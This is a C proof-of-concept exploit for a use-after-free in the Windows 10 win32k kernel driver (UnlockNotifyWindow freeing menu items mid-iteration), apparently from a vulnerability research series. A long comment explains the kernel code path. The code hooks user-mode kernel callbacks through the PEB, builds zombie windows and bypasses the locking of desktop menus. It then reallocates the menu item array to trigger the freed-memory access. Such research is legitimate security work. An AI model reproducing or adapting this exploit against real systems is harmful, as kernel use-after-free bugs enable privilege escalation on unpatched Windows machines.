//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #10 - UnlockNotifyWindow PMENU UAF
// Windows 10 x64
//

/*
In this POC we're going to attack the following kernel function:
void UnlockNotifyWindow(pmenu)
{
  for (pitem = pmenu->items; pitem != &pmenu->items[pmenu->cItems]; pitem++)
  {
	if (NULL != pitem->psubmenu)
	{
	  UnlockNotifyWindow(pitem->psubmenu); // Recursion without locking submenus!
	}
   }
  }

  HMAssignmentUnlock(&pmenu->notificationWnd); // SPARTAAAA!!!
}

Imagine that the menu->notificationWnd points to a last ref window.
Once the window is unlocked, it will call free-window-extra-bytes callback in user-mode and from
there we can modify the menu as we see fit while it's iterating innocently on freed items back in the kernel.
We're specifically going to abuse the last line in the function where it unlocks a menu's notification window.
Now that we got a smashable site, we need to build our objects to reach that code flow, and it's getting ugly.

In order to get to run the unlocking function, we need to start from the end.
The UnlockNotifyWindow function is called from xxxDestroyWindow but only if the destroyed window is the desktop's menu notification window.

The following code is part of xxxDestroyWindow:
xxxDestroyWindow(pwnd)
{
  ...
  if (pwnd == pwnd->pmenu->notificationWnd)
  {
    UnlockMenuWnd(pwnd, &pwnd->pmenu);
  }
  ...
  if (pwnd == pwnd->desk->sysmenu->notificationWnd)
  {
    UnlockNotifyWindow(pwnd->sysmenu->pmenu); // Golden path
  }
  ...
}

This teaches us that we're going to need two windows involved to exploit this vulnerability.
One for the notification window of the menu to attack the UnlockNotifyWindow, to callback to user-mode in the middle of the iteration.
And another window for the window destruction function to invoke UnlockNotifyWindow in the first place.
It can't be the same one, as we need to reach a last ref on the notification window
(and as long as a window is being destryoed it's being referenced too).

Note that inside UnlockNotifyWindow when a recursion happens it doesn't temporarily lock the submenu. That's one way to attack that function.
But specifically with menus it's simpler, as it's possible to insert more items to the menu, which will cause a reallocation of the items-array.
Making the kernel's original iteration pointer obsolete pointing to a freed memory, even without attacking a submenu object.
But anyway we need a submenu object, because otherwise the function leaves just after unlocking a menu notification window and we won't be able to abuse anything.

Our first apparent actions are these:
Step #1 - Create a sysmenu for the desktop with another window as the sysmenu's notification window too.
Step #2 - Create an independent menu that has a last ref notification zombie, and that's the one to exit to user-mode too.
Step #3 - Attach both menus from both steps.
Step #4 - DestroyWindow on window of step #1, so it calls UnlockNotifyWindow.

Note that all the function snippets below are rough pseudo code with only the parts that are relevant for this exploit.

We call GetSysMenuOffset through NtUserCallHwndLock.
xxxLoadSysMenu eventually calls back to user-mode by xxxClientLoadMenu.
We hook the client stub for loadmenu, and we can return any menu we wish back to kernel for the manipulation to continue.
This gets our menu to be the desktop's one.

GetSysMenuOffset(pwnd)
{
  if (pwnd->flags & WS_SYSMENU)
  {
	pmenu = xxxLoadSysDesktopMenu();
	HMAssignmentLock(&pwnd->desk->sysmenu, pmenu);
  }
}

But our desktop menu doesn't have a notification window like we need for xxxDestroyWindow.

Normally to set a menu notification window you have to call SetMenu or SetWindowLong (GWL_ID which sets a menu too if the window isn't a child).
They call LockWndMenu to actually lock the window and the menu, both ways.
E.g. the window points to the menu, and the menu notification window points back to the window.
LockWndMenu(pwnd, ppmenu, pmenu)
{
  HMAssignmentLock(ppmenu, pmenu);
  HMAssignmentLock(&pmenu->notificationMenu, pwnd);
}
It's kind of a binding between both objects.

But if we look again at the snippet of xxxDestroyWindow, it calls UnlockWndMenu first before calling UnlockNotifyWindow.
Meaning that it actually resets the notification window for the menu, as it's the same one for the desktop menu.

Therefore, we need another way to lock the notification window of the menu.

The following function has two parts. The first one where it sets a sysmenu for the pwnd, a menu that we control.
(Oh yeah, the name of the function is confusing, beat me, but in reality it has a boolean value to set or remove a menu).
And the second part is the important one, it sets a notification window for a submenu of the menu we pass.
Meaning that we can exploit this function's behavior in order to only set a notification window, without the full binding.
And eventually it is helping to get xxxDestroyWindow to call UnlockNotifyWindow.
Also note that the good thing about this function is that it uses a callback to user-mode,
where we can zombify step #2 menu's notification window.

GetSystemMenu(pwnd)
{
  ...
  if pwnd->flags & WS_SYSMENU
  {
    pmenu = xxxLoadSysMenu();
    LockWndMenu(pwnd, &pwnd->sysmenu, pmenu);
    ...
  }
  if (NULL != pwnd->sysmenu && pwnd->sysmenu->cItems)
  {
    HMAssignmentLock(&pwnd->sysmenu->items[0]->notificationWnd, pwnd);
  }
}

The concept is all easy, just implementing it is a bit longer.

*/

#include <windows.h>
#include <stdio.h>

HWND g_hWnd = NULL; // This is the zombie window that will callback to user-mode from its last unlocking.
//HWND g_hDeskWnd = NULL; // This is the window that makes the call to UnlockNotifyWindow from xxxDestroyWindow.

int phase1 = 0; // State between threads and callbacks.

// This is the changing HMENU that CLM callback will return to kernel upon each call.
HMENU g_hClmMenu = NULL;
// This is the menu through which we change allocation size of our desktop menu from the unlocking callback (free extra bytes).
HMENU g_hParentMenu = NULL;

#define SOME_MENU_ID 1000

#define ClientAllocExtraBytes_NO 0x7b
#define ClientFreeExtraBytes_NO 0x7c
#define ClientLoadMenu_NO 0x4c
#define GetSysMenuOffset_NO 0x6f

#define DUMMYCLASS "classsdummmy"

typedef NTSTATUS (*faeb_ptr)(ULONG_PTR); // Alloc extra bytes stub prototype.
faeb_ptr g_faeb = NULL;
typedef NTSTATUS (*ffeb_ptr)(ULONG_PTR); // Free extra bytes stub prototype.
ffeb_ptr g_ffeb = NULL;
typedef NTSTATUS (*clm_ptr)(ULONG_PTR); // ClientLoadMenu stub prototype.
clm_ptr g_clm = NULL;
typedef ULONG_PTR (WINAPI *NtUserCallHwndLockPtr)(HWND hWnd, SIZE_T procNumber);
NtUserCallHwndLockPtr NtUserCallHwndLock = NULL;
typedef NTSTATUS (WINAPI *NtCallbackReturnPtr)(PVOID, ULONG, NTSTATUS);
NtCallbackReturnPtr NtCallbackReturnFunc = NULL;

ULONG_PTR getPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* getUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)getPEB() + 0x58);
}

void hookClientCallback(void** ptr, void* stub, DWORD fn)
{
	ULONG_PTR* ptrAddr = &getUser32Callbacks()[fn];
	*ptr = *(void**)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)stub;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);
}

// The following helper function sets a new notification window for a given menu.
// Basically, all we have to do is exploit GetSystemMenu's behavior once again (i.e the HMAssignmentLock in the snippet above).
// Bypassing LockWndMenu full binding.
// Note it overrides g_hClmMenu.
// It will set hWnd as the notification window for a given menu.
void setMenuNotificationWnd(HWND hWnd, HMENU hMenu)
{
	// If no window was passed, then create some window as parent, as it doesn't matter.
	if (hWnd == NULL)
	{
		hWnd = CreateWindow(DUMMYCLASS, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	}

	// Create some termporary menu.
	// Inside CLM tis time we have to return the newly created menu for this manipulation to work.
	g_hClmMenu = CreateMenu();
	// Add the target menu whose notificationWnd we want to replace with a new window.
	AppendMenu(g_hClmMenu, MF_POPUP, (UINT_PTR)hMenu, (LPCSTR)"O_o");
	GetSystemMenu(hWnd, FALSE);

	// We get eventually that the notification window submenu[0] of pm is now pointing to our dummy window...
	// Meanining it doesn't lock our target window anymore.
}

// This client-load-menu callback is called 3 times during our exploit. Where each time requires different treatment.
// 1. By GetSystemMenu - signal first thread for zombification.
// And for the rest of the times - just return menu from g_hClmMenu.
// 2. By GetSystemMenu of setMenuNotificationWnd.
// 3. by GetSysMenuOffset.
// 4. By GetSystemMenu of setMenuNotificationWnd.
LRESULT CALLBACK clm(ULONG_PTR)
{
	ULONG_PTR ret[3] = { 0 };
	// Always return the changing menu that g_hClmMenu refers to.
	ret[0] = (ULONG_PTR)g_hClmMenu;

	printf("Entering CLM\n");
	static int once = 1;
	if (once)
	{
		once = 0;
		// Signal window creation thread that it can proceed to zombification.
		phase1 = 1;
		// Wait a bit for the other thread to die.
		Sleep(1000);
	}

	// Callback or actually return to kernel with our controlled results (handle to menu).
	NtCallbackReturnFunc = (NtCallbackReturnPtr)GetProcAddress(GetModuleHandle("ntdll"), "NtCallbackReturn");
	return NtCallbackReturnFunc((PVOID)ret, sizeof(ret), 0);
}

DWORD CALLBACK threadProc(LPVOID)
{
	HWND hDeskWnd = NULL;
	HMENU hTmpMenu = NULL;

	WNDCLASS wc = { 0 };
	wc.lpszClassName = DUMMYCLASS;
	wc.lpfnWndProc = DefWindowProc;
	RegisterClass(&wc);

	// Set a new desktop so its own cache menus are still not set.
	// So when we call the sysmenu APIs, they actually remember our menu, and not someone else's.
	SetThreadDesktop(CreateDesktop("ShowMeYourDesktopAndIWillTellYouWhoYouAre", NULL, NULL, 0, GENERIC_ALL, NULL));

	// Hook ClientLoadMenu so we can return our menu of choosing to the sysmenu kernel functions.
	hookClientCallback((void**)&g_clm, (void*)clm, ClientLoadMenu_NO);

	///////////////////////////////
	// We start from step #2.
	// (it was easier to document from step 1, but start here with step #2):

	// Next we're going to call GetSystemMenu to do two needed things at once.
	// Create a menu that we return to GetSystemMenu:
	g_hClmMenu = CreateMenu();
	// 1. It will set a notification menu for this submenu.
	hTmpMenu = CreateMenu();
	AppendMenu(g_hClmMenu, MF_POPUP, (UINT_PTR)hTmpMenu, (LPCSTR)"TheBeatles");

	// 2. It calls back to CLM, so we turn our window (g_hWnd) into a zombie at that point.
	// This is the zombie reloading in action:
	GetSystemMenu(g_hWnd, FALSE);

	// By now g_hWnd is a zombie.
	// And we got a menu (g_hClmMenu) that is bound to g_hWnd->sysmenu,
	// and that its submenu (hTmpMenu) has a notification window.
	// Let's separate the menus so we can continue manipulating them for our use.
	RemoveMenu(g_hClmMenu, 0, MF_BYPOSITION);
	// Now we got hTmpMenu->notificationWnd pointing to our zombie and no backpointer from window to menu!
	// That's great.

	// But we introduced a new issue:
	// If we look at the snippet of GetSystemMenu above, we see it calls LockWndMenu.
	// Meaning that g_hWnd->sysmenu->notificationWnd also points to our zombie!
	// We need to break that binding, so our zombie eventually has only one last reference by hTmpMenu.

	// Then all we need is sysmenu->notificationWnd to point to another window.
	// Meaning that we could get LockWndMenu on the sysmenu (g_hClmMenu), with any other window, and we're done,
	// as it internally first unlocks our zombie window.
	// But LockWndMenu is smarter than the snippet I wrote above, it also checks to see that the notification window is either the same one or empty.
	// And both cases are not a fit for us.
	// How can we then, change the sysmenu->notificationWnd? very simple, by putting it as a submenu and invoking GetSystemMenu for its behavior once again :)

	// For that, we got a helper function to do the whole dance.
	// We didn't invoke it earlier, as we needed to do more than this dance as described.
	// Null as we don't care who's the parent.
	setMenuNotificationWnd(NULL, g_hClmMenu);

	// Finally, we got hTmpMenu->notificationWnd to point to a zombie with a last reference!
	// Basically at this point, we could stop and use this menu to attack other objects after calls to DestroyMenu.
	// Because DestroyMenu unlocks the notification window, and we can callback to user-mode while attacking other objects for UAF...
	// But we're on another mission here :)

	///////////////////////////////
	// Step #1:
	// Now we we are going to create a desktop menu.
	HMENU deskMenu = g_hClmMenu = CreateMenu(); // Start with a new menu, to be the desktop menu that UnlockNotifyWindow will be called with.

	// This is tiny step #3.
	// Attach our hTmpMenu as a submenu, which is smashing-ready.
	// Also note that a desktop menu must have another submenu set with a popup.
	AppendMenu(g_hClmMenu, MF_POPUP, (UINT_PTR)hTmpMenu, (LPCSTR)"JaiGuruDevaOm");

#if 1
	/////////////////////////////////
	// Manipulation for bypassing locked desktop menus
	// Desktop menus are prhohibited from being changed.
	// Since there's a recursion in UnlockNotifyWindow, we could modify a submenu of the desktop menu,
	// but instead, we can still change the desktop menu directly, by doing another trick.

	// Set an ID for the desktop menu.
	MENUITEMINFO mii = { 0 };
	mii.cbSize = sizeof(mii);
	mii.fMask = MIIM_ID;
	mii.wID = SOME_MENU_ID;
	SetMenuItemInfo(g_hClmMenu, 0, TRUE, &mii);

	// Create a new parent menu that has the desktop menu as a child.
	// Now using MF_BYCOMMAND with SOME_MENU_ID on g_hParentMenu,
	// we can change the desktop menu even though it should have been secured.
	// Because BYCOMMAND will scan the menu hierarchy for the right ID, and return that particular menu,
	// without re-validating it's a desktop menu :)
	// And this is what we do in the free-extra-bytes stub, to reallocate more items
	// to change the array pointer inside UnlockNotifyWindow...
	g_hParentMenu = CreateMenu();
	AppendMenu(g_hParentMenu, MF_POPUP, (UINT_PTR)g_hClmMenu, (LPCSTR)"DreamOn");
#endif

	// In the next step we set up the desktop menu.
	// Create the desktop window, which xxxDestroyWindow is acting upon.
	hDeskWnd = CreateWindow(DUMMYCLASS, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	// This time we're calling GetSysMenu which sets a desktop menu.
	NtUserCallHwndLock = (NtUserCallHwndLockPtr)GetProcAddress(GetModuleHandle("win32u"), "NtUserCallHwndLock");
	// GetSysMenuOffset calls our CLM stub, and this is where we return the g_hClmMenu.
	// GetsysMenuOffset doesn't use the hDeskWnd for anything useful but finding its corresponding desktop.
	NtUserCallHwndLock(hDeskWnd, GetSysMenuOffset_NO);

	// So far:
	// 1. We got a g_hDeskWnd->desk->sysmenu = some_new_menu;
	// 2. And we got some_new_menu having the smashing menu (hTmpMenu) as a submenu of the desktop->sysmenu.

	// What we're still missing is that the hDeskWnd is the notificationWnd of the desktop-menu!
	// That's the way for the if-statement to flow into UnlockNotifyWindow, right?
	// So we need to make the g_hClmMenu->notificationWnd to point to our hDeskWnd,
	// without the earlier if-statement in xxxDestroyWindow to derail us from our flow to exploitation.
	// Therefore, we can fix it with yet another notificationWnd dancing (this time using hDeskWnd to be the notification window):
	setMenuNotificationWnd(hDeskWnd, deskMenu);

	// Step #4 - Destroy the window to finally trigger UnlockNotifyWindow!

	// Debugging instructions:
	DebugBreak();
	// Here should BP on win32kfull!UnlockNotifyWindow
	// See which register is used to iterate the menu items with !pool <reg>.
	// Then remove this BP, so it won't disturb our single stepping over the recursion.
	// Then single step over the next call to UnlockNotifyWindow.
	// And now !pool at the same address of the items before, and it should be freed.
	DestroyWindow(hDeskWnd);

	return 0;
}

LRESULT CALLBACK cbtHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		static int once = 1;
		if (once)
		{
			printf("CBT hook\n");
			if (g_hWnd == (HWND)wParam) // Just make sure it's our window.
			{
				ExitThread(0);
			}
		}
	}

	return 0;
}

LRESULT CALLBACK faeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Client alloc extra bytes called\n");

		WORD nextHandle = HIWORD(g_hWnd) + 1;
		WORD indexHandle = LOWORD(g_hWnd);
		g_hWnd = (HWND)((ULONG_PTR)indexHandle | ((ULONG_PTR)nextHandle << 16));

		printf("Hook it: %d\n", IsWindow(g_hWnd));

		// Create a second thread that will hold a reference on this window, before it becomes a zombie.
		CreateThread(NULL, 0, threadProc, NULL, 0, NULL);
		// Wait for the second thread to enter CLM with our to-be-zombie window locked.
		while (!phase1) Sleep(10);

		// Destroy the window to make it a zombie.
		DestroyWindow(g_hWnd);

		// This goes back to xxxCreateWindow to store the user-mode pointer we just give it.
	}

	return g_faeb(a);
}

LRESULT CALLBACK ffeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;

		// Allocate more items in the menu that UnlockNotifyWindow is iterating on.
		// So the array pointer is reallocated!!
		HMENU hMenu = CreatePopupMenu();
		for (int i = 0; i < 50; i++)
		{
			InsertMenu(g_hParentMenu, SOME_MENU_ID, MF_BYCOMMAND | MF_POPUP, (UINT_PTR)hMenu, "UAFme");
		}

		printf("Client free extra bytes called\n");
	}

	return g_ffeb(a);
}

int main()
{
	WNDCLASS wc = { 0 };
	wc.lpszClassName = "someclass";
	wc.lpfnWndProc = DefWindowProc;
	// This is crucial for xxxCreateWindowEx to do client-extra-bytes allocation/deallocation.
	wc.cbWndExtra = 100;
	RegisterClass(&wc);

	for (int i = 0; i < 100; i++)
	{
		g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		DestroyWindow(g_hWnd);
	}

	hookClientCallback((void**)&g_faeb, (void*)faeb, ClientAllocExtraBytes_NO);
	hookClientCallback((void**)&g_ffeb, (void*)ffeb, ClientFreeExtraBytes_NO);

	// CBT is where we terminate our own thread.
	SetWindowsHookEx(WH_CBT, cbtHookProc, NULL, GetCurrentThreadId());
	// WS_SYSMENU is needed for sysmenu APIs to work.
	CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	return 0;
}
